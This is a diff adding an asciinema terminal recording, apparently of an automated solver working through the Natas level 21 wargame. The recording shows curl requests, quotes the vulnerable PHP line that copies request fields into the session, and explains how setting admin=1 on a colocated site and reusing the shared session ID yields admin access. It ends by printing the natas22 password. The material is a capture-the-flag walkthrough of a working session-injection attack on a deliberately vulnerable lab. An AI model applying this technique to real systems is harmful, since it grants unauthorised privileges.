@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793507075,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L21.sh","title":"Natas L21 -> natas22: shared-session admin injection via experimenter","env":{"SHELL":"/bin/bash"}}
+[0.003, "o", "$ curl -s -u natas21:<pw> http://natas21.natas.labs.overthewire.org/index-source.html\r\n$   main page: session_start(); print_credentials() if $_SESSION[\"admin\"]==1\r\n$   colocated with natas21-experimenter: its source sets any $_SESSION[key]=val on submit\r\n"]
+[0.437, "o", "foreach($_REQUEST as $key => $val) {    $_SESSION[$key] = $val;    }\r\n"]
+[0.000, "o", "$ POST admin=1 to the experimenter (shares the session), then use the same\r\n$ PHPSESSID on the main host -> admin=1\r\n"]
+[0.392, "o", "session id: 2p8j19b7fg1rnn6ms2msiq17p4\r\n"]
+[0.389, "o", "admin: True\r\n<pre>Username: natas22\r\nPassword: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF</pre>\r\n"]
+[0.005, "o", "$ verify: curl -u natas22:<pw> http://natas22.natas.labs.overthewire.org/ -> 200\r\n"]
+[0.001, "x", "0"]
